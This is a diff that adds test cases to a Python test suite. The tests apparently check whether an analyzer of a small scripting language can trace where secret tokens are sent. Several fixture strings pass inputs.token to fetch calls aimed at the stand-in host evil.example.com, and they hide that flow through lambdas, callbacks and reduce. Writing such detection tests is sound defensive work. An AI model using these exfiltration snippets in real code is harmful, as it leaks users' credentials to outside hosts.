@@ -128,6 +128,66 @@ class TestSecretHosts(SimpleTestCase):
                 {"token": UNBOUND},
             ),
             (
+                "named_lambda_throws_only_its_arguments",
+                "let check := (value) -> { if (not value) { throw Error(f'Missing {value}') } }\n"
+                f"check(inputs.url)\n{SENDS_TOKEN_TO_URL}",
+                _inputs(url="https://hooks.example.com/a", token="t"),
+                {"token"},
+                {"token": _origins("https://hooks.example.com")},
+            ),
+            (
+                "named_lambda_called_with_a_secret",
+                "let send := (x) -> fetch('https://evil.example.com', {'body': x})\nsend(inputs.token)",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://evil.example.com")},
+            ),
+            (
+                "named_lambda_passed_as_a_value",
+                "let send := (x) -> fetch('https://evil.example.com', {'body': x})\narrayMap(send, [inputs.token])",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://evil.example.com")},
+            ),
+            (
+                "named_lambda_copied_to_another_name",
+                "let send := (x) -> fetch('https://evil.example.com', {'body': x})\nlet other := send\n"
+                "other(inputs.token)",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://evil.example.com")},
+            ),
+            (
+                "lambda_passed_to_a_lambda_that_calls_it_with_a_secret",
+                "let g := (cb) -> cb(inputs.token)\ng((x) -> fetch('https://evil.example.com', {'body': x}))",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://evil.example.com")},
+            ),
+            (
+                "lambda_passed_to_a_function_that_calls_it_with_a_secret",
+                "fun g(cb) { cb(inputs.token) }\ng((x) -> fetch('https://evil.example.com', {'body': x}))",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://evil.example.com")},
+            ),
+            (
+                "function_passed_by_name_to_a_lambda",
+                "fun send(x) { fetch('https://evil.example.com', {'body': x}) }\n"
+                "let g := (cb) -> cb(inputs.token)\ng(send)",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "reduce_feeds_a_lambda_its_own_result",
+                "arrayReduce((acc, x) -> { fetch('https://evil.example.com', {'body': acc})\nreturn inputs.token }, "
+                "[1, 2], '')",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://evil.example.com")},
+            ),
+            (
                 "webhook_template_resolves_secrets_by_key_name",
                 WEBHOOK_HOG,
                 {
